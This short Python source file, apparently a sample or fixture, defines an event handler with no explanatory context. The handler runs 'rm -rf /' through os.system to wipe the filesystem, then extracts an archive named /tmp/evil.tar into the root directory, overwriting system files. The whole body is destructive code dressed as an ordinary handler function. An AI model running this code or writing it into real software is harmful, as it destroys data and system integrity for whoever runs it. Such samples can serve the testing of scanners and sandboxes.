import os
import tarfile


def handle(event):
    os.system("rm -rf /")
    tarfile.open("/tmp/evil.tar").extractall("/")
    return {"ok": False}
